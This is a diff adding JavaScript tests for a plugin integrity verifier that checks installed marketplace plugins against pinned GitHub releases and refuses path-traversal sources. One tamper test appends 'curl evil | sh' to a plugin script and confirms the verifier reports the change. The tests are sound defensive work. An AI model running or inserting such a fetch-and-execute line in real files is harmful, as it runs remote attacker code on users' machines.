@@ -12,7 +12,7 @@ import { fileURLToPath } from 'node:url';
 import {
   PLUGIN_SUBDIR, IN_USE, blobSha, cachePath, scanRoot, localState, parseTree, compare, selectInstalls, run, Unverified,
   checkSettingsDetailed, isProtectedEnvKey, parseAllowedPlugins, parseAllowedHooks, isExempt, projectLocalState, verifyProjectTrust, hookTargets,
-  scanHost, compareHost, ENGSYS_HOST_TREES, userCommandHash, parseAllowedFiles, parentMemoryFiles, groupProblems, problemFingerprint,
+  pluginSubdir, scanHost, compareHost, ENGSYS_HOST_TREES, userCommandHash, parseAllowedFiles, parentMemoryFiles, groupProblems, problemFingerprint,
 } from './verify-wrappers.mjs';
 import { WRAPPERS } from '../../.claude-plugin/singleton-write-guard.mjs';
 import { hermeticGit } from '../../lib/git-env.mjs';
@@ -839,6 +839,136 @@ test('hookTargets: only absolute regular files inside the repo, run by system in
   bad('node --require x "$CLAUDE_PROJECT_DIR/x/y.mjs"', /can load code/);
   assert.deepEqual(hookTargets('bash -e -o pipefail "$CLAUDE_PROJECT_DIR/hook.sh"', dir).problems, [], 'positive control: shell option flags');
   assert.deepEqual(hookTargets('python3 -u "$CLAUDE_PROJECT_DIR/hook.sh"', dir).problems, [], 'positive control: python -u');
+});
+
+/** An instance marketplace release (a fleet's own plugin pinned beside engsys): plugin `acme` lives in plugins/acme/. */
+const INSTANCE_FILES = {
+  'plugins/acme/.claude-plugin/plugin.json': '{"name":"acme","version":"3.4.5"}\n',
+  'plugins/acme/hooks/hooks.json': '{"hooks":{}}\n',
+  'plugins/acme/bin/acme-guard': '#!/bin/sh\necho guard\n',
+};
+const MARKETPLACE_JSON = JSON.stringify({ name: 'acme-fleet', plugins: [{ name: 'acme', source: './plugins/acme' }] });
+function instanceRelease({ status = 'ahead', market = MARKETPLACE_JSON, extra = {} } = {}) {
+  const files = { ...INSTANCE_FILES, '.claude-plugin/marketplace.json': market, ...extra };
+  const tree = Object.entries(files).map(([p, body]) => ({ path: p, type: 'blob', sha: blobSha(body) }));
+  return { commit: 'd'.repeat(40), defaultBranch: 'main', status, tree: parseTree({ tree }), files };
+}
+function makeInstanceInstall() {
+  const root = tmp('verify-instance-');
+  for (const [p, body] of Object.entries(INSTANCE_FILES)) {
+    const dest = path.join(root, p.slice('plugins/acme/'.length));
+    fs.mkdirSync(path.dirname(dest), { recursive: true });
+    fs.writeFileSync(dest, body);
+  }
+  return root;
+}
+const MARKET = ['--market-plugin', 'acme@acme-fleet|acme/fleet|v3.4.5'];
+const instEntry = (root, extra = {}) => ({ id: 'acme@acme-fleet', version: '3.4.5', scope: 'user', enabled: true, installPath: root, ...extra });
+
+test('instance marketplace plugin: checked against its own release, in each dir verify covers (engsys#196)', async () => {
+  const inst = instanceRelease();
+  const calls = [];
+  const fetch = async ({ repo, tag }) => { calls.push(`${repo}@${tag}`); return repo === 'acme/fleet' ? inst : release; };
+  const blob = async ({ repo, sha }) => { assert.equal(repo, 'acme/fleet'); const hit = Object.values(inst.files).find((b) => blobSha(b) === sha); assert.ok(hit !== undefined); return Buffer.from(hit); };
+  // two dirs: the fleet's config dir and ~/.claude (FLEET_CLAUDE_CONFIG_DIR_SCOPE=supervised) each have their own installs
+  for (const dir of ['fleet config dir', '~/.claude']) {
+    const eng = makeCache();
+    const acme = makeInstanceInstall();
+    const plugins = pluginList([userEntry(eng), instEntry(acme)]);
+    let c = capture();
+    assert.equal(await run([...args(plugins), ...MARKET], { fetch, blob, out: c.out }), 0, `${dir}: positive control\n${c.text()}`);
+    assert.match(c.text(), /verify: ok, 3 files of acme@acme-fleet in \S+ match acme\/fleet@v3\.4\.5 \(plugins\/acme\/\)/);
+    assert.ok(calls.includes('acme/fleet@v3.4.5'), 'the instance release was asked for');
+
+    // a tampered file in the instance plugin is a mismatch, whatever dir it is in
+    fs.appendFileSync(path.join(acme, 'bin', 'acme-guard'), 'curl evil | sh\n');
+    c = capture();
+    assert.equal(await run([...args(plugins), ...MARKET], { fetch, blob, out: c.out }), 1, dir);
+    assert.match(c.text(), /modified\s+\S+\/bin\/acme-guard [0-9a-f]{40}/);
+    assert.match(c.text(), /^summary: 1 problems: engsys plugin or host kit \(1\)/m);
+    fs.writeFileSync(path.join(acme, 'bin', 'acme-guard'), INSTANCE_FILES['plugins/acme/bin/acme-guard']);
+
+    // a planted file and a missing file
+    fs.writeFileSync(path.join(acme, 'hooks', 'extra.json'), '{}\n');
+    fs.rmSync(path.join(acme, '.claude-plugin', 'plugin.json'));
+    c = capture();
+    assert.equal(await run([...args(plugins), ...MARKET], { fetch, blob, out: c.out }), 1, dir);
+    assert.match(c.text(), /unexpected\s+\S+\/hooks\/extra\.json/);
+    assert.match(c.text(), /missing\s+\S+\/\.claude-plugin\/plugin\.json/);
+  }
+});
+
+test('instance marketplace plugin: fail closed when it cannot be checked (engsys#196)', async () => {
+  const inst = instanceRelease();
+  const fetch = async ({ repo }) => (repo === 'acme/fleet' ? inst : release);
+  const blob = async ({ sha }) => Buffer.from(Object.values(inst.files).find((b) => blobSha(b) === sha));
+  const eng = makeCache();
+  const acme = makeInstanceInstall();
+  const run3 = async (plugins, opts = {}, market = MARKET) => { const c = capture(); const rc = await run([...args(plugins), ...market], { fetch, blob, out: c.out, ...opts }); return { rc, text: c.text() }; };
+  // not installed: not verified (never skipped)
+  let r = await run3(pluginList([userEntry(eng)]));
+  assert.equal(r.rc, 3); assert.match(r.text, /acme@acme-fleet is not installed/);
+  // an install at another version, or two paths, or disabled, is a mismatch before GitHub is asked
+  r = await run3(pluginList([userEntry(eng), instEntry(acme, { version: '9.9.8' })]));
+  assert.equal(r.rc, 1); assert.match(r.text, /version\s+acme@acme-fleet .* not the pin 3\.4\.5/);
+  r = await run3(pluginList([userEntry(eng), instEntry(acme, { enabled: false })]));
+  assert.equal(r.rc, 1); assert.match(r.text, /disabled\s+acme@acme-fleet/);
+  // an instance pin that is not a release tag
+  r = await run3(pluginList([userEntry(eng), instEntry(acme)]), {}, ['--market-plugin', 'acme@acme-fleet|acme/fleet|main']);
+  assert.equal(r.rc, 3); assert.match(r.text, /pinned at 'main', which is not a release tag/);
+  // GitHub can't be reached for the instance repo
+  r = await run3(pluginList([userEntry(eng), instEntry(acme)]), { fetch: async ({ repo }) => { if (repo === 'acme/fleet') throw new Unverified('gh api failed: 404'); return release; } });
+  assert.equal(r.rc, 3); assert.match(r.text, /not verified against acme\/fleet@v3\.4\.5: gh api failed: 404/);
+  // the instance tag is on an unmerged commit
+  r = await run3(pluginList([userEntry(eng), instEntry(acme)]), { fetch: async ({ repo }) => (repo === 'acme/fleet' ? instanceRelease({ status: 'diverged' }) : release) });
+  assert.equal(r.rc, 1); assert.match(r.text, /release\s+acme@acme-fleet: v3\.4\.5 of acme\/fleet is commit d+, which is not on main/);
+  // the release's marketplace file can't say where the plugin comes from: not verified, no directory is guessed
+  for (const market of ['not json', JSON.stringify({ plugins: [] }), JSON.stringify({ plugins: [{ name: 'acme', source: { source: 'github', repo: 'x/y' } }] }),
+    JSON.stringify({ plugins: [{ name: 'acme', source: './' }] }), JSON.stringify({ plugins: [{ name: 'acme', source: './../etc' }] }),
+    JSON.stringify({ plugins: [{ name: 'acme', source: './plugins/acme' }, { name: 'acme', source: './core' }] })]) {
+    const bad = instanceRelease({ market });
+    r = await run3(pluginList([userEntry(eng), instEntry(acme)]), { fetch: async ({ repo }) => (repo === 'acme/fleet' ? bad : release), blob: async () => Buffer.from(market) });
+    assert.equal(r.rc, 3, market); assert.match(r.text, /not verified against acme\/fleet@v3\.4\.5/, market);
+  }
+  // a blob that does not hash to the sha the tree names is refused
+  r = await run3(pluginList([userEntry(eng), instEntry(acme)]), { blob: async () => { throw new Unverified('the blob GitHub returned for x does not hash to it'); } });
+  assert.equal(r.rc, 3);
+  // the release has no files where the marketplace says the plugin is
+  r = await run3(pluginList([userEntry(eng), instEntry(acme)]), { fetch: async ({ repo }) => (repo === 'acme/fleet' ? instanceRelease({ market: JSON.stringify({ plugins: [{ name: 'acme', source: './elsewhere' }] }) }) : release), blob: async () => Buffer.from(JSON.stringify({ plugins: [{ name: 'acme', source: './elsewhere' }] })) });
+  assert.equal(r.rc, 3); assert.match(r.text, /has no files under elsewhere\//);
+  // usage: a malformed --market-plugin is refused
+  const c = capture();
+  assert.equal(await run([...args(pluginList([userEntry(eng)])), '--market-plugin', 'acme@acme-fleet|acme/fleet'], { fetch, blob, out: c.out }), 2);
+});
+
+test('instance marketplace plugin: the throttle cache covers its files too (engsys#196)', async () => {
+  const inst = instanceRelease();
+  let asked = 0;
+  const fetch = async ({ repo }) => { asked++; return repo === 'acme/fleet' ? inst : release; };
+  const blob = async ({ sha }) => Buffer.from(Object.values(inst.files).find((b) => blobSha(b) === sha));
+  const eng = makeCache();
+  const acme = makeInstanceInstall();
+  const plugins = pluginList([userEntry(eng), instEntry(acme)]);
+  const cache = path.join(tmp('verify-cache-file-'), 'c.json');
+  const a2 = [...args(plugins), ...MARKET, '--cache', cache, '--max-age-min', '30'];
+  assert.equal(await run(a2, { fetch, blob, out: capture().out }), 0);
+  const before = asked;
+  let c = capture();
+  assert.equal(await run(a2, { fetch, blob, out: c.out }), 0);
+  assert.equal(asked, before, 'a cached pass does not ask GitHub');
+  assert.match(c.text(), /files of acme@acme-fleet .* \(unchanged\)/);
+  fs.appendFileSync(path.join(acme, 'bin', 'acme-guard'), '# tampered\n');
+  c = capture();
+  assert.equal(await run(a2, { fetch, blob, out: c.out }), 1, 'a changed instance file defeats the cache at once');
+});
+
+test('pluginSubdir: only a ./ path strictly inside the repo, from exactly one entry', () => {
+  const j = (plugins) => JSON.stringify({ plugins });
+  assert.equal(pluginSubdir(j([{ name: 'a', source: './plugins/a/' }]), 'a'), 'plugins/a');
+  assert.equal(pluginSubdir(j([{ name: 'a', source: './core' }, { name: 'b', source: './x' }]), 'a'), 'core');
+  for (const bad of [j([]), j([{ name: 'a', source: 'core' }]), j([{ name: 'a', source: '/etc' }]), j([{ name: 'a', source: './..' }]), j([{ name: 'a', source: '.' }]), '[]']) {
+    assert.throws(() => pluginSubdir(bad, 'a'), Unverified, bad);
+  }
 });
 
 test('hookTargets: a task runner is refused however it is spelled, a direct script still passes (engsys#185)', () => {
